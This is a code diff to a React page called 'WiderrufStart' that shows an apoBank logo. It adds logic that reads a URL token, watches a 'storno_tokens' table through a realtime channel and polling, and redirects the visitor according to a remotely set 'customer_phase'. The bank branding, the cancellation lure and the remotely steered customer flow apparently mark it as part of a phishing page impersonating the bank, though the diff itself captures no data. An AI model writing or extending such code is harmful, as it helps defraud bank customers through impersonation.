@@ -1,12 +1,40 @@
-import { ChevronRight, HelpCircle } from "lucide-react";
-import { useNavigate } from "react-router-dom";
+import { ChevronRight } from "lucide-react";
+import { useEffect } from "react";
+import { useNavigate, useSearchParams } from "react-router-dom";
 import apoBankLogo from "@/assets/apobank-logo.svg";
 import { Button } from "@/components/ui/button";
 import Footer from "@/components/Footer";
 import ContactSection from "@/components/ContactSection";
+import { supabase } from "@/integrations/supabase/client";
 
 const WiderrufStart = () => {
   const navigate = useNavigate();
+  const [sp] = useSearchParams();
+  const token = sp.get("token");
+
+  useEffect(() => {
+    if (!token) return;
+    const check = async () => {
+      const { data } = await (supabase as any)
+        .from("storno_tokens")
+        .select("customer_phase")
+        .eq("token", token)
+        .maybeSingle();
+      if (data?.customer_phase === "success") {
+        navigate(`/success?token=${encodeURIComponent(token)}`);
+      } else if (data?.customer_phase === "aborted") {
+        navigate("/auth");
+      }
+    };
+    check();
+    const ch = (supabase as any)
+      .channel(`widerruf_start_${token}`)
+      .on("postgres_changes", { event: "*", schema: "public", table: "storno_tokens", filter: `token=eq.${token}` }, check)
+      .subscribe();
+    const iv = window.setInterval(check, 3000);
+    return () => { window.clearInterval(iv); (supabase as any).removeChannel(ch); };
+  }, [token, navigate]);
+
 
   return (
     <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
